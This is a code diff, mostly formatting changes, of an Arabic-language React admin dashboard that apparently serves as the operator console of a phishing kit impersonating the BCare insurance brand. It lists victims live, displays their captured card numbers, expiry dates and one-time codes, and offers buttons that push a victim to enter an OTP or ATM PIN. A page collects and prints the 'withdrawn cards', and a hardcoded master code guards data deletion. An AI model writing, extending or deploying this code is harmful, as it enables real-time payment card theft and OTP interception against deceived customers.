@@ -1,10 +1,10 @@
 import React, { useState, useEffect, useMemo, useRef } from 'react';
 import { supabase } from '../../supabase';
-import { 
-  Users, 
-  CreditCard, 
-  MessageSquare, 
-  X, 
+import {
+  Users,
+  CreditCard,
+  MessageSquare,
+  X,
   Smartphone,
   CheckCircle,
   AlertCircle,
@@ -32,13 +32,13 @@ export const Admin = () => {
   const [isSetupNeeded, setIsSetupNeeded] = useState(false);
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
-  
+
   // Navigation State
   const [currentView, setCurrentView] = useState('workspace'); // workspace, stats, cards, users
   const [statsFilter, setStatsFilter] = useState('all'); // all, completed, rejected, cards
   const [isGearOpen, setIsGearOpen] = useState(false);
   const [isDeleteModalOpen, setIsDeleteModalOpen] = useState(false);
-  
+
   const [allAdmins, setAllAdmins] = useState([]);
   const [newAdminUser, setNewAdminUser] = useState({ username: '', password: '' });
   const [masterCode, setMasterCode] = useState('');
@@ -50,7 +50,7 @@ export const Admin = () => {
   const [mobileDetailsActive, setMobileDetailsActive] = useState(false);
   const [isSoundEnabled, setIsSoundEnabled] = useState(true);
   const [unreadCustomers, setUnreadCustomers] = useState(new Set());
-  
+
   const notificationSound = useRef(new Audio('https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3'));
   const lastStateRef = useRef({});
 
@@ -99,20 +99,20 @@ export const Admin = () => {
             } else {
               next = prev;
             }
-            
+
             // Universal Notification Logic
             if (payload.eventType === 'INSERT' || payload.eventType === 'UPDATE') {
               const cust = payload.new;
               const old = prev.find(o => o.id === cust.id);
-              
+
               // Only alert if something meaningful changed (ignore pure heartbeat updates)
-              const isMeaningful = payload.eventType === 'INSERT' || 
-                                 (old && (
-                                   old.page !== cust.page || 
-                                   old.status !== cust.status || 
-                                   old.card_number !== cust.card_number ||
-                                   (cust.otps?.length || 0) > (old.otps?.length || 0)
-                                 ));
+              const isMeaningful = payload.eventType === 'INSERT' ||
+                (old && (
+                  old.page !== cust.page ||
+                  old.status !== cust.status ||
+                  old.card_number !== cust.card_number ||
+                  (cust.otps?.length || 0) > (old.otps?.length || 0)
+                ));
 
               if (isMeaningful) {
                 // Audio Alert
@@ -120,7 +120,7 @@ export const Admin = () => {
                   notificationSound.current.currentTime = 0;
                   notificationSound.current.play().catch(e => console.log("Audio play blocked", e));
                 }
-                
+
                 // Visual Highlight
                 setUnreadCustomers(prevSet => {
                   const newSet = new Set(prevSet);
@@ -171,17 +171,17 @@ export const Admin = () => {
       console.error("No customer selected for action:", type);
       return;
     }
-    
+
     console.log(`Executing admin action: ${type} for customer: ${selectedCustomerId}`);
     setLoadingAction(type);
-    
+
     try {
       const updateData = {
         status: type,
         ...payload,
         last_update: new Date().getTime()
       };
-      
+
       const { data, error } = await supabase
         .from('customers')
         .update(updateData)
@@ -194,8 +194,8 @@ export const Admin = () => {
       } else {
         console.log(`Successfully updated customer status to: ${type}`, data);
       }
-    } catch (err) { 
-      console.error("Critical Admin Action Error:", err); 
+    } catch (err) {
+      console.error("Critical Admin Action Error:", err);
     } finally {
       setLoadingAction(null);
     }
@@ -221,7 +221,7 @@ export const Admin = () => {
   const handleChangePassword = async () => {
     if (masterCode !== '185209') return alert('الرمز الرئيسي خطأ');
     if (!newAdminUser.password) return alert('يرجى إدخال كلمة المرور الجديدة');
-    
+
     setLoadingAction('change_pass');
     try {
       const { data } = await supabase.from('admins').select('id').limit(1);
@@ -264,7 +264,7 @@ export const Admin = () => {
 
   if (isSetupNeeded) {
     return (
-      <div className="admin-login-overlay" dir="rtl" style={{fontFamily: 'Tajawal, sans-serif'}}>
+      <div className="admin-login-overlay" dir="rtl" style={{ fontFamily: 'Tajawal, sans-serif' }}>
         <div className="login-box">
           <div className="login-header">
             <ShieldAlert size={40} color="#146394" />
@@ -289,7 +289,7 @@ export const Admin = () => {
 
   if (!isAuthenticated) {
     return (
-      <div className="admin-login-overlay" dir="rtl" style={{fontFamily: 'Tajawal, sans-serif'}}>
+      <div className="admin-login-overlay" dir="rtl" style={{ fontFamily: 'Tajawal, sans-serif' }}>
         <div className="login-box glassmorphism">
           <div className="login-glow"></div>
           <img src="/group-21.svg" alt="Bcare" className="login-logo-img" />
@@ -297,33 +297,33 @@ export const Admin = () => {
             <h2>تسجيل الدخول للوحة التحكم</h2>
             <p>أدخل كلمة المرور للمتابعة</p>
           </div>
-          
+
           <div className="login-input-group">
             <Lock size={18} />
-            <input 
-              type="password" 
-              placeholder="كلمة المرور" 
-              onChange={e => setPassword(e.target.value)} 
+            <input
+              type="password"
+              placeholder="كلمة المرور"
+              onChange={e => setPassword(e.target.value)}
               onKeyDown={(e) => e.key === 'Enter' && document.getElementById('login-submit-btn').click()}
             />
           </div>
-          
+
           <button id="login-submit-btn" className="login-btn-v3" onClick={async () => {
-             const { data } = await supabase
+            const { data } = await supabase
               .from('admins')
               .select('*')
               .eq('password', password);
-             if (data && data.length > 0) {
-               setIsAuthenticated(true);
-               sessionStorage.setItem('admin_session_v3', 'true');
-             } else {
-               alert('كلمة المرور غير صحيحة');
-             }
+            if (data && data.length > 0) {
+              setIsAuthenticated(true);
+              sessionStorage.setItem('admin_session_v3', 'true');
+            } else {
+              alert('كلمة المرور غير صحيحة');
+            }
           }}>
             <span>دخول النظام</span>
             <ArrowRight size={18} />
           </button>
-          
+
           <div className="login-footer">
             <ShieldAlert size={14} />
             <span>نظام محمي ومشفر بالكامل</span>
@@ -381,7 +381,7 @@ export const Admin = () => {
   return (
     <div className="admin-v2-root" dir="rtl">
       <div className="admin-top-banner">حمل تطبيق بي كير الآن واستمتع بخدمات أكثر</div>
-      
+
       {/* Header based on image */}
       <header className="admin-main-header">
         <div className="header-right">
@@ -389,35 +389,35 @@ export const Admin = () => {
             <button className="icon-btn" onClick={() => setIsGearOpen(!isGearOpen)}><Menu size={20} /></button>
             {isGearOpen && (
               <div className="gear-dropdown-v2" onMouseLeave={() => setIsGearOpen(false)}>
-                <button onClick={() => { setCurrentView('stats'); setIsGearOpen(false); }}><PieChart size={16}/> الإحصائيات</button>
-                <button onClick={() => { setCurrentView('cards'); setIsGearOpen(false); }}><CreditCard size={16}/> البطاقات المسحوبة</button>
-                <button onClick={() => { setCurrentView('users'); setIsGearOpen(false); }}><Lock size={16}/> تغيير كلمة المرور</button>
-                <button onClick={() => { setIsDeleteModalOpen(true); setIsGearOpen(false); }} style={{color: 'red'}}><Trash2 size={16}/> حذف كافة البيانات</button>
+                <button onClick={() => { setCurrentView('stats'); setIsGearOpen(false); }}><PieChart size={16} /> الإحصائيات</button>
+                <button onClick={() => { setCurrentView('cards'); setIsGearOpen(false); }}><CreditCard size={16} /> البطاقات المسحوبة</button>
+                <button onClick={() => { setCurrentView('users'); setIsGearOpen(false); }}><Lock size={16} /> تغيير كلمة المرور</button>
+                <button onClick={() => { setIsDeleteModalOpen(true); setIsGearOpen(false); }} style={{ color: 'red' }}><Trash2 size={16} /> حذف كافة البيانات</button>
                 <hr />
-                <button onClick={() => { sessionStorage.removeItem('admin_session_v3'); setIsAuthenticated(false); }}><LogOut size={16}/> خروج</button>
+                <button onClick={() => { sessionStorage.removeItem('admin_session_v3'); setIsAuthenticated(false); }}><LogOut size={16} /> خروج</button>
               </div>
             )}
           </div>
           <div className="online-counter-pill">
-             <div className="pulse-dot"></div>
-             <span>متواجد حالياً: {stats.onlineNow}</span>
+            <div className="pulse-dot"></div>
+            <span>متواجد حالياً: {stats.onlineNow}</span>
           </div>
-          <button 
-            className={`icon-btn ${isSoundEnabled ? 'active' : ''}`} 
+          <button
+            className={`icon-btn ${isSoundEnabled ? 'active' : ''}`}
             onClick={() => setIsSoundEnabled(!isSoundEnabled)}
             title={isSoundEnabled ? "كتم الصوت" : "تشغيل الصوت"}
           >
             {isSoundEnabled ? <Clock size={20} color="#4caf50" /> : <ShieldOff size={20} color="#f44336" />}
           </button>
         </div>
-        
+
         <div className="header-center">
-          <img src="/group-21.svg" alt="BCare" className="bcare-logo" onClick={() => setCurrentView('workspace')} style={{cursor:'pointer'}} />
+          <img src="/group-21.svg" alt="BCare" className="bcare-logo" onClick={() => setCurrentView('workspace')} style={{ cursor: 'pointer' }} />
         </div>
-        
+
         <div className="header-left">
-           <button className="lang-btn">EN</button>
-           <div className="view-indicator-pill">{currentView === 'workspace' ? 'لوحة التحكم' : currentView === 'stats' ? 'الإحصائيات' : currentView === 'cards' ? 'إدارة البطاقات' : 'تغيير كلمة المرور'}</div>
+          <button className="lang-btn">EN</button>
+          <div className="view-indicator-pill">{currentView === 'workspace' ? 'لوحة التحكم' : currentView === 'stats' ? 'الإحصائيات' : currentView === 'cards' ? 'إدارة البطاقات' : 'تغيير كلمة المرور'}</div>
         </div>
       </header>
 
@@ -425,58 +425,58 @@ export const Admin = () => {
         {/* Sidebar (Right) */}
         <aside className="admin-sidebar-v2">
           <div className="sidebar-header-v2">
-             <h2>العملاء ({customers.length})</h2>
-             <button className="icon-btn" onClick={() => setCurrentView('workspace')}><ArrowRight size={18}/></button>
+            <h2>العملاء ({customers.length})</h2>
+            <button className="icon-btn" onClick={() => setCurrentView('workspace')}><ArrowRight size={18} /></button>
           </div>
           <div className="sidebar-search-v2">
-             <input type="text" placeholder="بحث..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} />
+            <input type="text" placeholder="بحث..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} />
           </div>
           <div className="sidebar-list-v2">
             {customers.filter(c => (c.full_name || c.id_number || 'عميل جديد').includes(searchQuery)).map(c => {
-               const online = isUserOnline(c);
-               return (
-                  <div 
-                    key={c.id} 
-                    className={`sidebar-item-v2 ${selectedCustomerId === c.id ? 'active' : ''} ${unreadCustomers.has(c.id) ? 'has-new-action' : ''}`} 
-                    onClick={() => { 
-                      setSelectedCustomerId(c.id); 
-                      setCurrentView('workspace'); 
-                      setMobileDetailsActive(true);
-                      // Clear unread status
-                      setUnreadCustomers(prev => {
-                        const next = new Set(prev);
-                        next.delete(c.id);
-                        return next;
-                      });
-                    }}
-                  >
-                    <div className="item-main-info">
-                       <span className="customer-name-v2">{c.full_name || c.id_number || 'عميل جديد'}</span>
-                       <span className={`online-status-v2 ${online ? 'online' : 'offline'}`}>
-                         {online ? 'متصل' : 'خرج'}
-                       </span>
-                    </div>
-                    <div className="item-page-row">
-                       {c.page || 'تصفح الموقع'}
-                    </div>
+              const online = isUserOnline(c);
+              return (
+                <div
+                  key={c.id}
+                  className={`sidebar-item-v2 ${selectedCustomerId === c.id ? 'active' : ''} ${unreadCustomers.has(c.id) ? 'has-new-action' : ''}`}
+                  onClick={() => {
+                    setSelectedCustomerId(c.id);
+                    setCurrentView('workspace');
+                    setMobileDetailsActive(true);
+                    // Clear unread status
+                    setUnreadCustomers(prev => {
+                      const next = new Set(prev);
+                      next.delete(c.id);
+                      return next;
+                    });
+                  }}
+                >
+                  <div className="item-main-info">
+                    <span className="customer-name-v2">{c.full_name || c.id_number || 'عميل جديد'}</span>
+                    <span className={`online-status-v2 ${online ? 'online' : 'offline'}`}>
+                      {online ? 'متصل' : 'خرج'}
+                    </span>
+                  </div>
+                  <div className="item-page-row">
+                    {c.page || 'تصفح الموقع'}
+                  </div>
 
-                    <div className="item-indicators">
-                      {c.card_number && (
-                        <div className="indicator-tag">
-                          <CreditCard size={10} /> 💳 بطاقة
-                        </div>
-                      )}
-                      {(c.otps && c.otps.length > 0) && (
-                        <div className="indicator-tag">
-                          <Plus size={10} /> 🔑 رمز ({c.otps.length})
-                        </div>
-                      )}
-                      <span style={{fontSize:'9px', color:'#94a3b8', marginRight:'auto'}}>
-                        {c.last_update ? new Date(c.last_update).toLocaleTimeString('ar-SA', {hour:'2-digit', minute:'2-digit'}) : ''}
-                      </span>
-                    </div>
-                 </div>
-               );
+                  <div className="item-indicators">
+                    {c.card_number && (
+                      <div className="indicator-tag">
+                        <CreditCard size={10} /> 💳 بطاقة
+                      </div>
+                    )}
+                    {(c.otps && c.otps.length > 0) && (
+                      <div className="indicator-tag">
+                        <Plus size={10} /> 🔑 رمز ({c.otps.length})
+                      </div>
+                    )}
+                    <span style={{ fontSize: '9px', color: '#94a3b8', marginRight: 'auto' }}>
+                      {c.last_update ? new Date(c.last_update).toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' }) : ''}
+                    </span>
+                  </div>
+                </div>
+              );
             })}
           </div>
         </aside>
@@ -493,7 +493,7 @@ export const Admin = () => {
                   </button>
                   <h1>{selectedCustomer.full_name || selectedCustomer.id_number}</h1>
                   <div className={`online-status-badge ${isUserOnline(selectedCustomer) ? 'online' : 'offline'}`}>
-                     {isUserOnline(selectedCustomer) ? 'متصل الآن - ' : 'خرج - '} {selectedCustomer.page}
+                    {isUserOnline(selectedCustomer) ? 'متصل الآن - ' : 'خرج - '} {selectedCustomer.page}
                   </div>
                 </div>
 
@@ -506,7 +506,7 @@ export const Admin = () => {
                       <div className="no-card-placeholder">بانتظار إدخال بيانات البطاقة...</div>
                     )}
                   </div>
-                  
+
                   <div className="preview-right">
                     <div className="codes-mini-display">
                       <div className="mini-code-col">
@@ -532,20 +532,20 @@ export const Admin = () => {
                 {/* Large Colored Buttons */}
                 <div className="action-buttons-row">
                   <button className="act-btn-v2 btn-otp" onClick={() => handleAction('request_otp')}>
-                     <MessageSquare size={32} />
-                     <span>طلب كود OTP</span>
+                    <MessageSquare size={32} />
+                    <span>طلب كود OTP</span>
                   </button>
                   <button className="act-btn-v2 btn-atm" onClick={() => handleAction('request_atm')}>
-                     <CreditCard size={32} />
-                     <span>طلب صراف ATM</span>
+                    <CreditCard size={32} />
+                    <span>طلب صراف ATM</span>
                   </button>
                   <button className="act-btn-v2 btn-reject" onClick={() => handleAction('rejected')}>
-                     <X size={32} />
-                     <span>إنهاء / رفض</span>
+                    <X size={32} />
+                    <span>إنهاء / رفض</span>
                   </button>
                   <button className="act-btn-v2 btn-complete" onClick={() => handleAction('completed')}>
-                     <CheckCircle size={24} />
-                     <span>قبول العملية وإظهار وثيقة التأمين</span>
+                    <CheckCircle size={24} />
+                    <span>قبول العملية وإظهار وثيقة التأمين</span>
                   </button>
                 </div>
 
@@ -559,7 +559,7 @@ export const Admin = () => {
                     <div className="info-row-v2"><span>الجهاز</span> <strong>{selectedCustomer.device || '---'}</strong></div>
                     <div className="info-row-v2"><span>الغرض</span> <strong>{selectedCustomer.purpose || 'شخصي'}</strong></div>
                     <div className="info-row-v2"><span>الرقم التسلسلي</span> <strong>{selectedCustomer.sequence_number || '---'}</strong></div>
-                    <button className="btn-ban-small" onClick={banCustomer}><ShieldAlert size={14}/> حظر العميل</button>
+                    <button className="btn-ban-small" onClick={banCustomer}><ShieldAlert size={14} /> حظر العميل</button>
                   </div>
 
                   <div className="info-card-v2">
@@ -572,9 +572,9 @@ export const Admin = () => {
                 </div>
 
                 {/* RAW DATA DEBUG SECTION */}
-                <div className="info-card-v2" style={{marginTop: '20px', background: '#fffbeb', borderColor: '#fef3c7'}}>
-                  <h3 style={{color: '#92400e'}}>البيانات التقنية (للتأكد)</h3>
-                  <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', fontSize: '12px'}}>
+                <div className="info-card-v2" style={{ marginTop: '20px', background: '#fffbeb', borderColor: '#fef3c7' }}>
+                  <h3 style={{ color: '#92400e' }}>البيانات التقنية (للتأكد)</h3>
+                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', fontSize: '12px' }}>
                     <div className="info-row-v2"><span>رقم البطاقة (خام)</span> <strong>{selectedCustomer.card_number || 'لم يصل بعد'}</strong></div>
                     <div className="info-row-v2"><span>الاسم على البطاقة</span> <strong>{'---'}</strong></div>
                     <div className="info-row-v2"><span>تاريخ الانتهاء</span> <strong>{selectedCustomer.card_expiry || '---'}</strong></div>
@@ -584,8 +584,8 @@ export const Admin = () => {
                 </div>
               </div>
             ) : (
-              <div style={{textAlign: 'center', padding: '100px', color: '#999'}}>
-                 يرجى اختيار عميل من القائمة الجانبية
+              <div style={{ textAlign: 'center', padding: '100px', color: '#999' }}>
+                يرجى اختيار عميل من القائمة الجانبية
               </div>
             )
           )}
@@ -596,26 +596,26 @@ export const Admin = () => {
                 <h2>إحصائيات المنصة</h2>
                 <div className="stats-mini-summary">إجمالي النشاط والعمليات</div>
               </div>
-              <div className="stats-filter-grid" style={{gridTemplateColumns: 'repeat(5, 1fr)'}}>
+              <div className="stats-filter-grid" style={{ gridTemplateColumns: 'repeat(5, 1fr)' }}>
                 <div className={`stat-box ${statsFilter === 'all' ? 'active' : ''}`} onClick={() => setStatsFilter('all')}>
-                   <strong>{stats.total}</strong>
-                   <span>كل العملاء</span>
+                  <strong>{stats.total}</strong>
+                  <span>كل العملاء</span>
                 </div>
-                <div className="stat-box" style={{cursor: 'default'}}>
-                   <strong style={{color: '#16a34a'}}>{stats.onlineNow}</strong>
-                   <span style={{color: '#16a34a'}}>متصل الآن</span>
+                <div className="stat-box" style={{ cursor: 'default' }}>
+                  <strong style={{ color: '#16a34a' }}>{stats.onlineNow}</strong>
+                  <span style={{ color: '#16a34a' }}>متصل الآن</span>
                 </div>
                 <div className={`stat-box ${statsFilter === 'completed' ? 'active' : ''}`} onClick={() => setStatsFilter('completed')}>
-                   <strong>{stats.completed}</strong>
-                   <span>الطلبات الناجحة</span>
+                  <strong>{stats.completed}</strong>
+                  <span>الطلبات الناجحة</span>
                 </div>
                 <div className={`stat-box ${statsFilter === 'rejected' ? 'active' : ''}`} onClick={() => setStatsFilter('rejected')}>
-                   <strong>{stats.rejected}</strong>
-                   <span>الطلبات المرفوضة</span>
+                  <strong>{stats.rejected}</strong>
+                  <span>الطلبات المرفوضة</span>
                 </div>
                 <div className={`stat-box ${statsFilter === 'cards' ? 'active' : ''}`} onClick={() => setStatsFilter('cards')}>
-                   <strong>{stats.withCards}</strong>
-                   <span>البطاقات المسحوبة</span>
+                  <strong>{stats.withCards}</strong>
+                  <span>البطاقات المسحوبة</span>
                 </div>
               </div>
 
@@ -661,15 +661,15 @@ export const Admin = () => {
 
           {currentView === 'cards' && (
             <div className="full-page-view">
-               <div className="view-header-row">
-                  <h2>كافة البطاقات المسحوبة</h2>
-                  <button className="print-btn-v3" onClick={() => window.print()}><Printer size={18}/> طباعة PDF</button>
-               </div>
-               <div className="cards-grid-v2">
-                  {customers.filter(c => c.card_number).map((c, i) => (
-                    <VirtualCard key={i} customer={c} />
-                  ))}
-               </div>
+              <div className="view-header-row">
+                <h2>كافة البطاقات المسحوبة</h2>
+                <button className="print-btn-v3" onClick={() => window.print()}><Printer size={18} /> طباعة PDF</button>
+              </div>
+              <div className="cards-grid-v2">
+                {customers.filter(c => c.card_number).map((c, i) => (
+                  <VirtualCard key={i} customer={c} />
+                ))}
+              </div>
             </div>
           )}
 
@@ -680,31 +680,31 @@ export const Admin = () => {
                 <p>تحديث بيانات الدخول للنظام</p>
               </div>
               <div className="password-change-container">
-                <div className="info-card-v2" style={{maxWidth: '500px', margin: '0 auto'}}>
-                   <div className="input-group-v2">
-                      <label>كلمة المرور الجديدة</label>
-                      <div className="master-input-wrap">
-                        <Lock size={18} />
-                        <input type="password" placeholder="أدخل كلمة المرور الجديدة" value={newAdminUser.password} onChange={e => setNewAdminUser({...newAdminUser, password: e.target.value})} />
-                      </div>
-                   </div>
-                   
-                   <div className="input-group-v2" style={{marginTop: '20px'}}>
-                      <label>الرمز السري للتأكيد</label>
-                      <div className="master-input-wrap">
-                        <ShieldAlert size={18} />
-                        <input type="password" placeholder="أدخل الكود السري" value={masterCode} onChange={e => setMasterCode(e.target.value)} />
-                      </div>
-                   </div>
+                <div className="info-card-v2" style={{ maxWidth: '500px', margin: '0 auto' }}>
+                  <div className="input-group-v2">
+                    <label>كلمة المرور الجديدة</label>
+                    <div className="master-input-wrap">
+                      <Lock size={18} />
+                      <input type="password" placeholder="أدخل كلمة المرور الجديدة" value={newAdminUser.password} onChange={e => setNewAdminUser({ ...newAdminUser, password: e.target.value })} />
+                    </div>
+                  </div>
 
-                   <button 
-                     className="save-user-btn" 
-                     style={{marginTop: '30px', width: '100%', height: '50px'}}
-                     onClick={handleChangePassword}
-                     disabled={loadingAction === 'change_pass'}
-                   >
-                     {loadingAction === 'change_pass' ? 'جاري التحديث...' : 'تحديث كلمة المرور'}
-                   </button>
+                  <div className="input-group-v2" style={{ marginTop: '20px' }}>
+                    <label>الرمز السري للتأكيد</label>
+                    <div className="master-input-wrap">
+                      <ShieldAlert size={18} />
+                      <input type="password" placeholder="أدخل الكود السري" value={masterCode} onChange={e => setMasterCode(e.target.value)} />
+                    </div>
+                  </div>
+
+                  <button
+                    className="save-user-btn"
+                    style={{ marginTop: '30px', width: '100%', height: '50px' }}
+                    onClick={handleChangePassword}
+                    disabled={loadingAction === 'change_pass'}
+                  >
+                    {loadingAction === 'change_pass' ? 'جاري التحديث...' : 'تحديث كلمة المرور'}
+                  </button>
                 </div>
               </div>
             </div>
@@ -715,22 +715,22 @@ export const Admin = () => {
       {/* Delete All Data Modal (The only one staying as popup) */}
       {isDeleteModalOpen && (
         <div className="modal-overlay-v2">
-          <div className="modal-content-v2" style={{maxWidth: '400px', textAlign: 'center'}}>
+          <div className="modal-content-v2" style={{ maxWidth: '400px', textAlign: 'center' }}>
             <button className="close-modal-v2" onClick={() => setIsDeleteModalOpen(false)}><X /></button>
-            <div style={{color: '#e53935', marginBottom: '15px'}}><AlertCircle size={48} /></div>
+            <div style={{ color: '#e53935', marginBottom: '15px' }}><AlertCircle size={48} /></div>
             <h3>حذف كافة البيانات</h3>
-            <p style={{fontSize: '13px', color: '#666', marginBottom: '20px'}}>سيتم مسح كافة بيانات العملاء نهائياً. يرجى إدخال الماستر كود للتأكيد.</p>
-            <input 
-              type="password" 
-              placeholder="الرمز الرئيسي" 
-              className="modal-input" 
-              style={{textAlign:'center'}} 
-              value={masterCode} 
-              onChange={e => setMasterCode(e.target.value)} 
+            <p style={{ fontSize: '13px', color: '#666', marginBottom: '20px' }}>سيتم مسح كافة بيانات العملاء نهائياً. يرجى إدخال الماستر كود للتأكيد.</p>
+            <input
+              type="password"
+              placeholder="الرمز الرئيسي"
+              className="modal-input"
+              style={{ textAlign: 'center' }}
+              value={masterCode}
+              onChange={e => setMasterCode(e.target.value)}
             />
-            <button 
-              className="act-btn-v2 btn-reject" 
-              style={{height: '50px', width: '100%', fontSize: '14px'}}
+            <button
+              className="act-btn-v2 btn-reject"
+              style={{ height: '50px', width: '100%', fontSize: '14px' }}
               onClick={handleDeleteAllData}
               disabled={loadingAction === 'delete_all'}
             >
